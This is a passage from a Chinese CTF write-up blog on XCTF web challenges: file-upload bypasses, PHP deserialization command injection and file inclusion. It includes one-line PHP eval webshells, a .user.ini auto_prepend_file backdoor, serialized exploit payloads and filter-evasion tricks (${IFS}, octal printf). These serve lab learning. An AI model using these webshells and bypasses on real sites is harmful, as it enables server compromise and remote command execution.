以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<strong>管理员可以通过Apache的AllowOverride指令来设置</strong>。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>​<strong>.htaccess的配置文件只能在Apache服务器中起作用</strong></p></li><li><p><strong>&#x3D;&#x3D;.user.ini&#x3D;&#x3D;<strong>：</strong>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</strong></p></li><li><p><code>&lt;?php =eval($_REQUEST[&quot;xxx&quot;] )?&gt;</code>:_REQUEST包含了 _GET、 GET、_POST、$_COOKIE的所有内容，是它们的集合体。也就内是说只要用其中一种方容式做一个表单，把cmd这个变量给POST或者GET，甚至用cookies就可以把传输上去的内容执行。简而言之吧，就是执行cmd的值。</p></li><li><p><strong>蚁剑的工作原理：首先你需要发现服务端的一句话木马，每次连接的密码其实就是一句话木马的名字，蚁剑会帮你执行各种代码以获取完整的服务器目录。</strong></p></li><li><p>**&#x3D;&#x3D;利用.user.ini的条件&#x3D;&#x3D;**：</p><p>**服务器脚本语言为PHP **</p><p>**服务器使用CGI **</p><p>**FastCGI模式 **</p><p><strong>上传目录下要有可执行的php文件</strong></p></li><li><p>**&#x3D;&#x3D;图片头文件GIF89a&#x3D;&#x3D;**：</p><p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年发行），但在<strong>Web上所见到的大多数图形都是以89a版的格式创建的</strong>。 89a版的一个最主要的优势就是<strong>可以创建动态图像</strong>，特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。</p></li><li><p><strong>关于在Content-Type中multipart&#x2F;form-data的解析：</strong></p><p><strong>boundary是表示分隔，用于分隔多个文件。格式是：–后面跟着一串随机数</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryNolPbAiXBmFZAw6W<br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br>//提交为文件<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;fileUpload&quot;; filename=&quot;.user.ini&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br>//这里的content-type是文件类型，浏览器自己判断<br>GIF89a<br>auto_prepend_file=b.jpg<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload&quot;<br>æäº¤<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W--<br><br>//提交为表单字段<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;note&quot;<br>字段内容<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h5><p>首先试一下能不能访问<code>index.phps</code>，<code>flag.php</code>，好吧，都没用。题目的意思一个是想让我们上传一张图片。我们先上传其他的类型的文件试试：</p><p>上传.txt文件回显：<code>your filetype looks wicked</code>（你的文件是恶意的），说明大部分的文件格式被过滤</p><p>上传图片文件回显：<code>file upload successful, the path is:  uploads/2051259.jpg</code></p><p>可以知道文件上传后是存放在uploads&#x2F;文件夹里</p><p><strong>我们需要明确一点，文件上传的解题是需要我们上传可执行文件，从而控制服务端</strong></p><p><strong>所以我们这里使用.user.ini配置文件来让index.php文件包含一个webshell，所以我们先创建一个包含shell语句的图片马b.txt</strong></p><p>内容如下：之后修改文件后缀为.gif，直接上传即可，因为图片文件未被过滤</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br>&lt;?=eval($_REQUEST<span class="hljs-section">[&#x27;cmd&#x27;]</span>)<span class="hljs-comment">;?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_6.jpg"></p><p><strong>之后想办法上传.user.ini文件，但会被过滤，所以我们使用BP抓包，修改上传文件的类型<code>application/octet-stream</code>为<code>image/gif</code>,</strong></p><p>创建一个.user.ini文件，其内容如下：auto_prepend_file是指当前目录下的任意php文件都要包含&#x3D;之后的文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=b.gif<br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_5.jpg"></p><p>上传成功，未被过滤</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_7.jpg"></p><p>下面我们使用蚁剑连接服务器：</p><p>首先查看地址，是要在<code>/uploads</code>目录下</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_4.jpg"></p><p>连接成功，可能会连接不上，多上传几次</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_2.jpg"></p><p>在根目录下发现flag</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_3.jpg"></p><p>答案：cyberpeace{9f37b587e6875ce35380526dba1120c6}</p><h4 id="8-unseping-江苏工匠杯（过滤的绕过）"><a href="#8-unseping-江苏工匠杯（过滤的绕过）" class="headerlink" title="8_unseping 江苏工匠杯（过滤的绕过）"></a>8_unseping 江苏工匠杯（过滤的绕过）</h4><h5 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        &#125;<br>    &#125; <br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        &#125;<br>    &#125;   <br>&#125;<br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>PHP序列化和反序列化</strong>：</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php序列化和反序列化方式主要有：serialize，unserialize；json_encode，json_decode。</p></li><li><p>反序列化中常见的魔术函数：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>() 当一个对象创建时被调用，反序列化不触发<br><span class="hljs-built_in">__destruct</span>()  当一个对象销毁时被调用<br><span class="hljs-built_in">__toString</span>()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接<br><span class="hljs-built_in">__call</span>()      当调用的方法不存在时触发<br><span class="hljs-built_in">__invoke</span>()    当一个对象被当作函数调用时触发<br><span class="hljs-built_in">__wakeup</span>()    反序列化时自动调用<br><span class="hljs-built_in">__sleep</span>()     执行<span class="hljs-built_in">serialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__get</span>()       类中的属性私有或不存在触发<br><span class="hljs-built_in">__set</span>()       类中的属性私有或不存在触发<br></code></pre></td></tr></table></figure></li><li><p>PHP函数：</p><ul><li>call_user_func_array：把第一个参数作为回调函数进行调用，第二个参数传入数组，将数组中的值作为回调函数的参数</li><li>exec：用来执行一个外部程序，不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面</li><li>passthru：只调用命令，把命令的运行结果原样地直接输出到标准输出设备上</li><li>system：输出并返回最后一行shell结果</li></ul></li><li><p><strong>&#x3D;&#x3D;shell语句被过滤的一些绕过技巧：&#x3D;&#x3D;</strong></p><p><strong>空格被过滤：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt; 、&lt;&gt;、%09(tab键)、%20、$IFS$9、$IFS$1、$&#123;IFS&#125;、$IFS等，还可以用&#123;&#125; 比如 &#123;cat,flag&#125;<br></code></pre></td></tr></table></figure><p><strong>敏感字符被过滤：</strong></p><p>字符串转为8进制</p></li><li><p>linux中的**$**可以用于执行shell命令：$(shell)</p></li><li><h5 id="linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”"><a href="#linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”" class="headerlink" title="&#x3D;&#x3D;linux中的printf函数支持字符串的8进制表示的读入&#x3D;&#x3D;：使用printf “hello world”"></a>&#x3D;&#x3D;linux中的<code>printf</code>函数支持字符串的8进制表示的读入&#x3D;&#x3D;：使用printf “hello world”</h5></li></ul><h5 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h5><p>​        这是一个很明显的反序列化题。首先可以明确的是我们需要传入一个POST变量ctf，其反序列化生成的对象时，会首先调用construct函数构造一个对象，然后调用__wakeup函数，其调用了waf，去检测<code>args</code>里是否有敏感字符<code>cat|flag|tac|php|ls</code>，这里说明args应该是一个数组，先记下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//检测敏感字符</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后代码结束，调用__destruct函数，发现这是在查看上传的method是否在数组ping中，如果有，则调用<code>call_user_func_array</code>，将<code>array($this, $this-&gt;method)</code>作为函数，<code>this-&gt;args</code>作为函数参数，很显然，我们应该去调用ping函数，<strong>里面有exec函数，这个函数可以使用系统命令，我们可以查看当前服务器下的一些东西</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>那么上传变量的产生方式应为：在PHP代码里生成序列化，然后base64-encode。</strong></p><p>比如我们想要查看index.php同级目录下的文件，</p><p>我们可以在PHP中这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ls&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//但是我们想起来之前有一段对输入数组的过滤，其中就有ls，那么我们应该写为</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s&#x27;</span>));<span class="hljs-comment">//使用反写杠绕过过滤</span><br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</span><br></code></pre></td></tr></table></figure><p><strong>注意用POST参数传入</strong></p><p>那么我得到回显：<code>array(2) &#123; [0]=&gt; string(12) &quot;flag_1s_here&quot; [1]=&gt; string(9) &quot;index.php&quot; &#125;</code></p><p>说明index.php同级目录下还有一个<code>flag_1s_here</code>文件，没有后缀的话，可能时目录，编写shell，继续执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s$&#123;IFS&#125;-l$&#123;IFS&#125;fl\ag_1s_here&#x27;</span>));<span class="hljs-comment">//注意flag和空格也被过滤掉，分别用反斜杠和$&#123;IFS&#125;绕过</span><br>    <br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozMDoibFxzJHtJRlN9LWwke0lGU31mbFxhZ18xc19oZXJlIjt9fQ==</span><br></code></pre></td></tr></table></figure><p>回显：<code>array(2) &#123; [0]=&gt; string(7) &quot;total 4&quot; [1]=&gt; string(64) &quot;-rwxr-xr-x 1 root root 53 Nov 9 13:21 flag_831b69012c67b35f.php&quot; &#125;</code></p><p>flag应该就在<code>flag_831b69012c67b35f.php</code>里了</p><p><strong>因为<code>/</code>被过滤掉了，所以将字符串转为8进制，正常的字符串应该这样写</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;cat /flag_1s_here/flag_831b69012c67b35f.php&quot;)&#x27;</span>));<br></code></pre></td></tr></table></figure><p>那么转为8进制则为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160&quot;)&#x27;</span>));<br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</span><br></code></pre></td></tr></table></figure><p>最后访问即可得到flag：<code>cyberpeace&#123;48a58397b3c434b2436426a5c3479d12&#125;</code></p><h4 id="9-upload1"><a href="#9-upload1" class="headerlink" title="9_upload1"></a>9_upload1</h4><h5 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h5><p>文件上传题，检查网页源码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) &#123;  </span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;  </span><br><span class="language-javascript">    <span class="hljs-keyword">while</span> (i--) &#123;  </span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>[i] === obj) &#123;  </span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  </span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">upfile = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;upfile&quot;</span>);</span><br><span class="language-javascript">submit = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;submit&quot;</span>);</span><br><span class="language-javascript">name = upfile.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">ext = name.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.+\./</span>,<span class="hljs-string">&#x27;&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>([<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>].<span class="hljs-title function_">contains</span>(ext))&#123;</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;请选择一张图片文件上传!&#x27;</span>);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h5><ul><li>本题JS绕过：修改上传文件后缀</li></ul><h5 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h5><p>文件上传题，想办法上传webshell，很明显前端有一个JS过滤，有两种办法，一种是在网页元素里删除JS后上传，另一种是上传图片🐎，我这里选择上传图片🐎。</p><p>编写一个图片🐎b.jpg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>bypass前端后通过BP抓包修改</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_2.jpg"></p><p>回显：<code>upload success : upload/1667464623.b.php</code></p><p>通过蚁剑连接：<code>http://61.147.171.105:50598/upload/1667464623.b.php</code>   密码为：<code>cmd</code></p><p>找到flag</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_1.jpg"></p><h4 id="10-文件包含-泰山杯"><a href="#10-文件包含-泰山杯" class="headerlink" title="10_文件包含 泰山杯"></a>10_文件包含 泰山杯</h4><h5 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h5><p>文件包含题，进入直接一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h5><p>- </p><h5 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h5><p>很明显，要提交一个filename参数进去。</p><p>首先，随便提交一个payload，<code>filename=flag.php</code></p><p>有回显：<code>you have use the right usage , but error method</code></p><p>然后尝试一下php伪协议，payload：<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>有回显：<code>do not hack!</code>，说明是有过滤的。继续构造payload<code>filename=php://filter/read</code>，还是被过滤，说明是read被过滤掉了,同样的发现base64被过滤。</p><p>尝试后发现<code>convert.iconv.</code>未被过滤，那么可以使用BP对iconv中的两个字段爆破，使用提前编写好的字典。</p><p><strong>将<code>.iconv</code>的两个可选参数标为payload，并且选择<code>Cluster bomb</code>模式，设置好字典为准备好的.txt文件。爆破出来选择最长的response查看。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_3.jpg"></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_2.jpg"></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_1.jpg"></p><h4 id="11"><a href="#11" class="headerlink" title="11_"></a>11_</h4><h5 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h5><p>直接可以看到代码，检查网页源码也是一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span 